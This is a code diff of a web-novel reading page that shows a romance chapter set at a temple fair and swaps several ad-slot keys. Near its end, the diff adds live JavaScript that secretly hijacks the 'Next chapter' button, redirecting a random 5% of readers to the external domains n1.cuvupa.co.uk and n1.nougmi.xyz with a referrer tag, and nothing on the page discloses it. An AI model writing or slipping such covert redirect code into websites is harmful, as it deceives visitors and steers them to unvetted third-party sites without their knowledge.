@@ -2391,13 +2391,13 @@
                 <p>They hurriedly got ready and bought freshly fried pastries from a street vendor. The golden crust cracked open to reveal sweet red bean paste that stretched into silken threads with each bite.</p>
                 <p>The main thoroughfare was already packed with crowds.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>Alexander shielded Evelyn from the jostling masses, his arm a protective barrier around her waist. Through the fabric, she could feel the heat radiating from his skin.</p>
                 <p>&#34;I&#39;ll get soy milk.&#34; Evelyn seized the chance to step sideways.</p>
                 <p>But as she turned, two playing children came barreling toward her.</p>
                 <p>&#34;Watch out!&#34;</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>Alexander grabbed her wrist. In that split second, the second child collided with them.</p>
                 <p>Evelyn tumbled straight into his chest.</p>
                 <p>Her lips brushed against the prominent curve of his Adam&#39;s apple.</p>
@@ -2409,13 +2409,13 @@
                 <p>&#34;Since...you already got pastry sugar on me anyway.&#34;</p>
                 <p>Her ears burned. Just as she tried to pull away, twin voices piped up behind them.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>&#34;Sorry, miss!&#34; The identical boys chorused.</p>
                 <p>Their mother offered profuse apologies before enthusiastically explaining the fair&#39;s traditions: &#34;The fortune sticks are especially accurate today, though the lines are terribly long...&#34;</p>
                 <p>Evelyn&#39;s gaze drifted toward the distant temple veiled in incense smoke, her expression softening.</p>
                 <p>&#34;Want to go?&#34; Alexander asked.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>She gave a small nod. &#34;I never believed in these things before...but now I&#39;d like to try.&#34;</p>
                 <p>The deity procession advanced in a vibrant parade. Bare-chested men carried the sacred palanquin, their bronzed skin gleaming under the sun. Elderly participants matched the younger carriers&#39; steady pace without faltering.</p>
                 <p>&#34;Village life builds endurance,&#34; Evelyn observed. &#34;Farmers have far more strength than office workers.&#34;</p>
@@ -2424,7 +2424,7 @@
                 <p>The quiet words made Alexander&#39;s chest tighten.</p>
                 <p>This time, when his fingers interlaced with hers, Evelyn didn&#39;t pull away.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
             </div>
             
             <div class="font-controls">
@@ -2546,7 +2546,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2562,8 +2562,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
